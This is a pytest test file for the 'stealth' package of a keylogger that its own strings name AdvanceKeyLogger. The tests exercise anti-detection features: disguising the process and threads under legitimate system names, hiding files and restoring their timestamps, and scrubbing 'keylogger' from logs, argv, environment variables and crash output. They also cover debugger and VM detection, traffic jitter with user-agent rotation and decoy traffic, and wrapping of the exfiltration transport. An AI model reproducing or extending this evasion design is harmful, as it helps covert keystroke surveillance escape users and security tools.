"""
Comprehensive tests for the stealth/ package.

Covers:
  - ProcessMasker
  - FileSystemCloak
  - LogController
  - ResourceProfiler
  - DetectionAwareness
  - NetworkNormalizer
  - StealthManager (core orchestrator)
"""
from __future__ import annotations

import logging
import os
import platform
import stat
import sys
import tempfile
import threading
import time
from pathlib import Path
from unittest import mock

import pytest


# ---------------------------------------------------------------------------
# ProcessMasker
# ---------------------------------------------------------------------------

class TestProcessMasker:
    def test_init_defaults(self):
        from stealth.process_masking import ProcessMasker
        m = ProcessMasker()
        assert m._masquerade_name == "auto"
        assert m._sanitize_threads is True
        assert m._sanitize_argv is True

    def test_init_custom_config(self):
        from stealth.process_masking import ProcessMasker
        m = ProcessMasker({"masquerade_name": "myproc", "rotate_interval": 60})
        assert m._masquerade_name == "myproc"
        assert m._rotate_interval == 60

    def test_resolve_name_custom(self):
        from stealth.process_masking import ProcessMasker
        m = ProcessMasker({"masquerade_name": "custom-daemon"})
        assert m._resolve_name() == "custom-daemon"

    def test_resolve_name_auto(self):
        from stealth.process_masking import ProcessMasker, _LEGIT_NAMES
        m = ProcessMasker({"masquerade_name": "auto"})
        name = m._resolve_name()
        plat = platform.system().lower()
        names = _LEGIT_NAMES.get(plat, _LEGIT_NAMES["linux"])
        assert name in names

    def test_overwrite_argv(self):
        from stealth.process_masking import ProcessMasker
        original = sys.argv[0]
        try:
            ProcessMasker._overwrite_argv("test-name")
            assert sys.argv[0] == "test-name"
        finally:
            sys.argv[0] = original

    def test_apply_idempotent(self):
        from stealth.process_masking import ProcessMasker
        m = ProcessMasker({"masquerade_name": "test", "sanitize_threads": False})
        m.apply()
        m.apply()  # should not fail
        assert m._applied is True
        m.stop()

    def test_sanitize_thread(self):
        from stealth.process_masking import ProcessMasker, _INNOCUOUS_THREAD_NAMES
        m = ProcessMasker()
        t = threading.Thread(target=lambda: None, name="cgeventtap-keyboard")
        m.sanitize_thread(t)
        assert t.name in _INNOCUOUS_THREAD_NAMES

    def test_get_masquerade_name(self):
        from stealth.process_masking import ProcessMasker
        m = ProcessMasker({"masquerade_name": "hello"})
        assert m.get_masquerade_name() == "hello"

    def test_stop_without_start(self):
        from stealth.process_masking import ProcessMasker
        m = ProcessMasker()
        m.stop()  # should not raise


# ---------------------------------------------------------------------------
# FileSystemCloak
# ---------------------------------------------------------------------------

class TestFileSystemCloak:
    def test_init_defaults(self):
        from stealth.fs_cloak import FileSystemCloak
        c = FileSystemCloak()
        assert c._hidden_dirs is True
        assert c._timestamp_preservation is True

    def test_get_pid_path_returns_string(self):
        from stealth.fs_cloak import FileSystemCloak
        c = FileSystemCloak()
        pid = c.get_pid_path()
        assert isinstance(pid, str)
        assert len(pid) > 0

    def test_get_data_dir_returns_string(self):
        from stealth.fs_cloak import FileSystemCloak
        c = FileSystemCloak()
        d = c.get_data_dir()
        assert isinstance(d, str)

    def test_get_db_name(self):
        from stealth.fs_cloak import FileSystemCloak
        c = FileSystemCloak({"minimal_footprint": True})
        assert c.get_db_name() == "preferences.db"
        c2 = FileSystemCloak({"minimal_footprint": False})
        assert c2.get_db_name() == "cache.db"

    def test_get_cleanup_script_name(self):
        from stealth.fs_cloak import FileSystemCloak
        c = FileSystemCloak()
        name = c.get_cleanup_script_name()
        assert "keylogger" not in name.lower()
        assert "akl" not in name.lower()

    def test_preserve_timestamps(self):
        from stealth.fs_cloak import FileSystemCloak
        c = FileSystemCloak({"timestamp_preservation": True})
        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as f:
            f.write(b"hello")
            path = f.name

        try:
            # Set old timestamp
            old_time = 1000000000.0
            os.utime(path, (old_time, old_time))

            with c.preserve_timestamps(path):
                Path(path).write_text("modified")

            st = os.stat(path)
            assert abs(st.st_mtime - old_time) < 1.0
        finally:
            os.unlink(path)

    def test_timestamp_preservation_disabled(self):
        from stealth.fs_cloak import FileSystemCloak
        c = FileSystemCloak({"timestamp_preservation": False})
        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as f:
            f.write(b"hello")
            path = f.name

        try:
            old_time = 1000000000.0
            os.utime(path, (old_time, old_time))

            with c.preserve_timestamps(path):
                Path(path).write_text("modified")

            st = os.stat(path)
            # Should NOT be restored since preservation is disabled
            assert st.st_mtime > old_time
        finally:
            os.unlink(path)

    def test_custom_paths_override(self):
        from stealth.fs_cloak import FileSystemCloak
        c = FileSystemCloak({"custom_paths": {"pid_file": "/custom/pid"}})
        assert c.get_pid_path() == "/custom/pid"

    def test_service_label(self):
        from stealth.fs_cloak import FileSystemCloak
        c = FileSystemCloak()
        label = c.get_service_label()
        assert isinstance(label, str)
        assert "keylogger" not in label.lower()

    def test_service_description(self):
        from stealth.fs_cloak import FileSystemCloak
        c = FileSystemCloak()
        desc = c.get_service_description()
        assert isinstance(desc, str)
        assert "keylogger" not in desc.lower()

    def test_apply_creates_dirs(self):
        from stealth.fs_cloak import FileSystemCloak
        with tempfile.TemporaryDirectory() as tmpdir:
            data_dir = os.path.join(tmpdir, "test_data")
            c = FileSystemCloak({
                "hidden_dirs": False,
                "custom_paths": {
                    "data_dir": data_dir,
                    "key_store": os.path.join(tmpdir, "keys"),
                    "config_dir": os.path.join(tmpdir, "cfg"),
                }
            })
            c.apply()
            assert Path(data_dir).is_dir()


# ---------------------------------------------------------------------------
# LogController
# ---------------------------------------------------------------------------

class TestLogController:
    def test_init_defaults(self):
        from stealth.log_controller import LogController
        lc = LogController()
        assert lc._silent_mode is False
        assert lc._memory_ring_buffer is True

    def test_ring_buffer_handler(self):
        from stealth.log_controller import MemoryRingBufferHandler
        h = MemoryRingBufferHandler(capacity=10)
        lg = logging.getLogger("test.ring")
        lg.addHandler(h)
        lg.setLevel(logging.DEBUG)
        for i in range(15):
            lg.info("msg %d", i)
        entries = h.get_entries(limit=100)
        assert len(entries) == 10  # bounded by capacity
        lg.removeHandler(h)

    def test_log_sanitisation_filter(self):
        from stealth.log_controller import LogSanitisationFilter
        f = LogSanitisationFilter()
        record = logging.LogRecord(
            name="test", level=logging.INFO, pathname="", lineno=0,
            msg="Loading AdvanceKeyLogger from /tmp/advancekeylogger.pid",
            args=None, exc_info=None,
        )
        f.filter(record)
        assert "keylog" not in record.msg.lower()
        assert "advancekeylog" not in record.msg.lower()

    def test_apply_silent_mode(self):
        from stealth.log_controller import LogController
        lc = LogController({"silent_mode": True, "memory_ring_buffer": False,
                           "sanitize_messages": False})
        test_logger = logging.getLogger("test.silent")
        handler = logging.StreamHandler()
        test_logger.addHandler(handler)
        # Apply on root — silent mode removes StreamHandlers
        root = logging.getLogger()
        original_handlers = list(root.handlers)
        try:
            lc.apply()
            stream_handlers = [
                h for h in root.handlers
                if isinstance(h, logging.StreamHandler)
                and not isinstance(h, logging.FileHandler)
            ]
            assert len(stream_handlers) == 0
        finally:
            root.handlers = original_handlers
            test_logger.removeHandler(handler)

    def test_suppress_startup_banner(self):
        from stealth.log_controller import LogController
        lc = LogController({"suppress_startup_banner": True})
        assert lc.suppress_startup_banner is True
        lc2 = LogController({"suppress_startup_banner": False})
        assert lc2.suppress_startup_banner is False

    def test_get_recent_logs_empty(self):
        from stealth.log_controller import LogController
        lc = LogController({"memory_ring_buffer": False})
        assert lc.get_recent_logs() == []


# ---------------------------------------------------------------------------
# ResourceProfiler
# ---------------------------------------------------------------------------

class TestResourceProfiler:
    def test_jittered_interval(self):
        from stealth.resource_profiler import ResourceProfiler
        rp = ResourceProfiler({"cpu_jitter_factor": 0.3})
        values = [rp.jittered_interval(30.0) for _ in range(100)]
        # All values should be within [15, 60] (50%-200% of 30)
        assert all(15.0 <= v <= 60.0 for v in values)
        # Should have variance (not all the same)
        assert len(set(round(v, 2) for v in values)) > 1

    def test_io_spread_delay(self):
        from stealth.resource_profiler import ResourceProfiler
        rp = ResourceProfiler({"io_spread": True})
        delay = rp.get_io_spread_delay()
        assert 0.01 <= delay <= 0.1

    def test_io_spread_disabled(self):
        from stealth.resource_profiler import ResourceProfiler
        rp = ResourceProfiler({"io_spread": False})
        assert rp.get_io_spread_delay() == 0.0

    def test_get_status(self):
        from stealth.resource_profiler import ResourceProfiler
        rp = ResourceProfiler()
        status = rp.get_status()
        assert "priority_applied" in status
        assert "cpu_ceiling" in status

    def test_apply_priority_idempotent(self):
        from stealth.resource_profiler import ResourceProfiler
        rp = ResourceProfiler()
        rp.apply_priority()
        rp.apply_priority()  # second call should be no-op
        assert rp._priority_applied is True


# ---------------------------------------------------------------------------
# DetectionAwareness
# ---------------------------------------------------------------------------

class TestDetectionAwareness:
    def test_init_defaults(self):
        from stealth.detection_awareness import DetectionAwareness, ThreatLevel
        da = DetectionAwareness()
        assert da.threat_level == ThreatLevel.NONE
        assert da._enabled is True

    def test_scan_once_returns_level(self):
        from stealth.detection_awareness import DetectionAwareness, ThreatLevel
        da = DetectionAwareness({"vm_detection": False, "enabled": True})
        level = da.scan_once()
        assert isinstance(level, ThreatLevel)

    def test_get_status(self):
        from stealth.detection_awareness import DetectionAwareness
        da = DetectionAwareness()
        status = da.get_status()
        assert "enabled" in status
        assert "threat_level" in status
        assert "detections" in status

    def test_start_stop(self):
        from stealth.detection_awareness import DetectionAwareness
        # Disable VM detection to avoid slow system_profiler call on macOS
        da = DetectionAwareness({
            "scan_interval_min": 0.5, "scan_interval_max": 1,
            "vm_detection": False,
        })
        da.start()
        assert da._scanner_thread is not None
        time.sleep(1.5)
        da.stop()
        assert da._scanner_thread is None

    def test_disabled(self):
        from stealth.detection_awareness import DetectionAwareness
        da = DetectionAwareness({"enabled": False})
        da.start()
        assert da._scanner_thread is None

    def test_should_throttle_defaults(self):
        from stealth.detection_awareness import DetectionAwareness
        da = DetectionAwareness()
        # No scan done yet
        assert da.should_throttle() is False
        assert da.should_pause() is False

    def test_debugger_detection_no_debugger(self):
        from stealth.detection_awareness import DetectionAwareness
        da = DetectionAwareness()
        # sys.gettrace is None when no debugger is attached
        # (may be non-None in test runners with coverage)
        result = da._check_debugger()
        if sys.gettrace() is not None:
            assert result is True  # coverage/debugger is on
        # Just ensure it doesn't crash


# ---------------------------------------------------------------------------
# NetworkNormalizer
# ---------------------------------------------------------------------------

class TestNetworkNormalizer:
    def test_init_defaults(self):
        from stealth.network_normalizer import NetworkNormalizer
        nn = NetworkNormalizer()
        assert nn._timing_jitter == 0.4
        assert nn._ua_rotation is True

    def test_get_user_agent_fallback(self):
        from stealth.network_normalizer import NetworkNormalizer, _FALLBACK_USER_AGENTS
        nn = NetworkNormalizer()
        nn._ua_gen = "fallback"  # force fallback mode
        ua = nn.get_user_agent()
        assert ua in _FALLBACK_USER_AGENTS

    def test_normalize_payload_padding(self):
        from stealth.network_normalizer import NetworkNormalizer
        nn = NetworkNormalizer({"packet_normalization": True})
        small = b"hello"
        normalized = nn.normalize_payload(small)
        assert len(normalized) >= 1024

    def test_normalize_payload_large_passthrough(self):
        from stealth.network_normalizer import NetworkNormalizer
        nn = NetworkNormalizer({"packet_normalization": True})
        large = os.urandom(2048)
        normalized = nn.normalize_payload(large)
        assert normalized == large

    def test_normalize_payload_disabled(self):
        from stealth.network_normalizer import NetworkNormalizer
        nn = NetworkNormalizer({"packet_normalization": False})
        small = b"hi"
        assert nn.normalize_payload(small) == small

    def test_send_window(self):
        from stealth.network_normalizer import NetworkNormalizer
        nn = NetworkNormalizer({"send_window": {"enabled": False}})
        assert nn.is_in_send_window() is True

    def test_jitter_value(self):
        from stealth.network_normalizer import NetworkNormalizer
        nn = NetworkNormalizer({"timing_jitter": 0.3})
        values = [nn.jitter_value(10.0) for _ in range(50)]
        assert all(v >= 0.5 for v in values)
        assert len(set(round(v, 2) for v in values)) > 1

    def test_token_bucket(self):
        from stealth.network_normalizer import TokenBucket
        tb = TokenBucket(1000)  # 1000 bytes/sec
        wait = tb.consume(500)
        assert wait == 0.0  # should have enough tokens

    def test_resolve_dns_caching(self):
        from stealth.network_normalizer import NetworkNormalizer
        nn = NetworkNormalizer()
        # Resolve localhost which should always work
        ip1 = nn.resolve_dns("localhost")
        ip2 = nn.resolve_dns("localhost")
        assert ip1 == ip2

    def test_get_status(self):
        from stealth.network_normalizer import NetworkNormalizer
        nn = NetworkNormalizer()
        status = nn.get_status()
        assert "timing_jitter" in status
        assert "in_send_window" in status


# ---------------------------------------------------------------------------
# StealthManager (core)
# ---------------------------------------------------------------------------

class TestStealthManager:
    def test_init_disabled(self):
        from stealth.core import StealthManager
        sm = StealthManager({"enabled": False, "level": "off"})
        assert sm.enabled is False
        assert sm.level == "off"

    def test_init_level_medium(self):
        from stealth.core import StealthManager
        sm = StealthManager({"enabled": True, "level": "medium"})
        assert sm.enabled is True
        assert sm.level == "medium"

    def test_activate_when_disabled(self):
        from stealth.core import StealthManager
        sm = StealthManager({"enabled": False})
        sm.activate()
        assert sm._activated is False

    def test_get_status(self):
        from stealth.core import StealthManager
        sm = StealthManager({"enabled": True, "level": "low"})
        status = sm.get_status()
        assert "enabled" in status
        assert "level" in status
        assert status["level"] == "low"
        assert "detection" in status

    def test_get_pid_path_default(self):
        from stealth.core import StealthManager
        sm = StealthManager({"enabled": False})
        assert sm.get_pid_path() == "/tmp/.system-helper.pid"

    def test_get_pid_path_stealth(self):
        from stealth.core import StealthManager
        sm = StealthManager({"enabled": True, "level": "low"})
        pid = sm.get_pid_path()
        assert "keylogger" not in pid.lower()

    def test_should_suppress_banner_off(self):
        from stealth.core import StealthManager
        sm = StealthManager({"enabled": False})
        assert sm.should_suppress_banner() is False

    def test_should_suppress_banner_on(self):
        from stealth.core import StealthManager
        sm = StealthManager({"enabled": True, "level": "low"})
        assert sm.should_suppress_banner() is True

    def test_stop_without_activate(self):
        from stealth.core import StealthManager
        sm = StealthManager({"enabled": True, "level": "high"})
        sm.stop()  # should not raise

    def test_deep_merge(self):
        from stealth.core import _deep_merge
        base = {"a": {"b": 1, "c": 2}, "d": 3}
        overlay = {"a": {"b": 10, "e": 5}, "f": 6}
        merged = _deep_merge(base, overlay)
        assert merged == {"a": {"b": 10, "c": 2, "e": 5}, "d": 3, "f": 6}

    def test_get_data_dir_default(self):
        from stealth.core import StealthManager
        sm = StealthManager({"enabled": False})
        assert sm.get_data_dir() == "./data"


# ---------------------------------------------------------------------------
# Integration: imports work correctly
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# CrashGuard (enhanced v2)
# ---------------------------------------------------------------------------

class TestCrashGuard:
    def test_install_uninstall(self):
        from stealth.crash_guard import CrashGuard
        guard = CrashGuard()
        original = sys.excepthook
        guard.install()
        assert sys.excepthook != original
        guard.uninstall()
        # After uninstall, hook should be restored
        assert guard._installed is False

    def test_sanitize_filename(self):
        from stealth.crash_guard import _sanitize_filename
        # Identifiable path should be scrubbed
        result = _sanitize_filename("/home/user/AdvanceKeyLogger/capture/keyboard.py")
        assert "keylogger" not in result.lower()
        assert "capture" not in result.lower()
        assert result.startswith("<mod_")

    def test_sanitize_filename_safe_path(self):
        from stealth.crash_guard import _sanitize_filename
        # Non-identifiable path should keep basename
        result = _sanitize_filename("/usr/lib/python3/json/decoder.py")
        assert result == "decoder.py"

    def test_wrap_callable(self):
        from stealth.crash_guard import CrashGuard
        guard = CrashGuard({"logging": {"silent_mode": True}})

        def bad_func():
            raise ValueError("test error")

        wrapped = guard.wrap_callable(bad_func)
        # Should not raise
        result = wrapped()
        assert result is None

    def test_wrap_callable_keyboard_interrupt(self):
        from stealth.crash_guard import CrashGuard
        guard = CrashGuard()

        def ctrl_c():
            raise KeyboardInterrupt()

        wrapped = guard.wrap_callable(ctrl_c)
        with pytest.raises(KeyboardInterrupt):
            wrapped()


# ---------------------------------------------------------------------------
# MemoryCloak (enhanced v2)
# ---------------------------------------------------------------------------

class TestMemoryCloak:
    def test_init(self):
        from stealth.memory_cloak import MemoryCloak
        mc = MemoryCloak()
        assert mc._applied is False

    def test_secure_wipe_bytearray(self):
        from stealth.memory_cloak import MemoryCloak
        data = bytearray(b"secret_key_material")
        MemoryCloak.secure_wipe(data)
        assert all(b == 0 for b in data)

    def test_secure_wipe_ignores_non_bytearray(self):
        from stealth.memory_cloak import MemoryCloak
        # Should not raise on non-bytearray
        MemoryCloak.secure_wipe(b"immutable")
        MemoryCloak.secure_wipe("string")
        MemoryCloak.secure_wipe(None)

    def test_apply_idempotent(self):
        from stealth.memory_cloak import MemoryCloak
        mc = MemoryCloak()
        mc.apply()
        mc.apply()  # second call should be no-op
        assert mc._applied is True


# ---------------------------------------------------------------------------
# ImageScrubber (enhanced v2)
# ---------------------------------------------------------------------------

class TestImageScrubber:
    def test_generate_filename(self):
        from stealth.image_scrubber import ImageScrubber
        scrubber = ImageScrubber()
        name1 = scrubber.generate_filename("jpg")
        name2 = scrubber.generate_filename("png")
        assert name1.endswith(".jpg")
        assert name2.endswith(".png")
        assert name1 != name2
        assert "screenshot" not in name1.lower()

    def test_strip_metadata_without_pil(self):
        from stealth.image_scrubber import ImageScrubber
        scrubber = ImageScrubber()
        # Pass a non-PIL object -- should return it unchanged
        result = scrubber.strip_metadata("not an image")
        assert result == "not an image"

    def test_strip_metadata_with_pil(self):
        try:
            from PIL import Image
            from stealth.image_scrubber import ImageScrubber
            scrubber = ImageScrubber()
            # Create a simple test image
            img = Image.new("RGB", (100, 100), color="red")
            cleaned = scrubber.strip_metadata(img)
            assert isinstance(cleaned, Image.Image)
            assert cleaned.size == (100, 100)
        except ImportError:
            pytest.skip("PIL not available")


# ---------------------------------------------------------------------------
# EnvSanitizer (enhanced v2)
# ---------------------------------------------------------------------------

class TestEnvSanitizer:
    def test_init(self):
        from stealth.env_sanitizer import EnvSanitizer
        es = EnvSanitizer()
        assert es._applied is False

    def test_rename_env_vars(self):
        from stealth.env_sanitizer import EnvSanitizer
        # Set a test env var
        os.environ["KEYLOGGER_TEST_VAR"] = "test_value"
        try:
            es = EnvSanitizer()
            es._rename_env_vars()
            assert "KEYLOGGER_TEST_VAR" not in os.environ
            assert os.environ.get("SVC_TEST_VAR") == "test_value"
        finally:
            os.environ.pop("SVC_TEST_VAR", None)
            os.environ.pop("KEYLOGGER_TEST_VAR", None)

    def test_sanitize_argv(self):
        from stealth.env_sanitizer import EnvSanitizer
        original = list(sys.argv)
        try:
            sys.argv = ["advancekeylogger", "--config", "test.yaml"]
            EnvSanitizer._sanitize_full_argv()
            assert sys.argv[0] == "service"
        finally:
            sys.argv = original


# ---------------------------------------------------------------------------
# TransportBridge (enhanced v2)
# ---------------------------------------------------------------------------

class TestTransportBridge:
    def test_init(self):
        from stealth.network_normalizer import NetworkNormalizer
        from stealth.transport_bridge import TransportBridge
        nn = NetworkNormalizer()
        tb = TransportBridge(nn, {"decoy_traffic": False})
        assert tb._decoy_enabled is False

    def test_patch_transport(self):
        from stealth.network_normalizer import NetworkNormalizer
        from stealth.transport_bridge import TransportBridge

        nn = NetworkNormalizer()
        tb = TransportBridge(nn)

        class MockTransport:
            def __init__(self):
                self.sent = False
                self._session = None
            def send(self, payload, metadata=None):
                self.sent = True
                return True

        transport = MockTransport()
        original_send = transport.send
        tb.patch_transport(transport)
        # send should be wrapped now
        assert transport.send != original_send

    def test_stop_without_start(self):
        from stealth.network_normalizer import NetworkNormalizer
        from stealth.transport_bridge import TransportBridge
        nn = NetworkNormalizer()
        tb = TransportBridge(nn)
        tb.stop_decoy_traffic()  # should not raise


# ---------------------------------------------------------------------------
# Enhanced StealthManager (v2)
# ---------------------------------------------------------------------------

class TestEnhancedStealthManager:
    def test_new_subsystems_present(self):
        from stealth.core import StealthManager
        sm = StealthManager({"enabled": True, "level": "high"})
        assert hasattr(sm, "crash_guard")
        assert hasattr(sm, "memory_cloak")
        assert hasattr(sm, "image_scrubber")
        assert hasattr(sm, "env_sanitizer")
        assert hasattr(sm, "transport_bridge")

    def test_get_status_enhanced(self):
        from stealth.core import StealthManager
        sm = StealthManager({"enabled": True, "level": "medium"})
        status = sm.get_status()
        assert "crash_guard_installed" in status
        assert "memory_cloak_applied" in status
        assert "env_sanitized" in status

    def test_patch_transport_disabled(self):
        from stealth.core import StealthManager
        sm = StealthManager({"enabled": False})
        # Should be no-op when disabled
        sm.patch_transport(None)


# ---------------------------------------------------------------------------
# Integration: imports work correctly
# ---------------------------------------------------------------------------

class TestPackageImports:
    def test_import_stealth_package(self):
        import stealth
        assert hasattr(stealth, "StealthManager")

    def test_import_all_modules(self):
        from stealth.process_masking import ProcessMasker
        from stealth.fs_cloak import FileSystemCloak
        from stealth.log_controller import LogController
        from stealth.resource_profiler import ResourceProfiler
        from stealth.detection_awareness import DetectionAwareness
        from stealth.network_normalizer import NetworkNormalizer
        from stealth.core import StealthManager
        from stealth.crash_guard import CrashGuard
        from stealth.memory_cloak import MemoryCloak
        from stealth.image_scrubber import ImageScrubber
        from stealth.env_sanitizer import EnvSanitizer
        from stealth.transport_bridge import TransportBridge
        assert all([
            ProcessMasker, FileSystemCloak, LogController,
            ResourceProfiler, DetectionAwareness, NetworkNormalizer,
            StealthManager, CrashGuard, MemoryCloak,
            ImageScrubber, EnvSanitizer, TransportBridge,
        ])
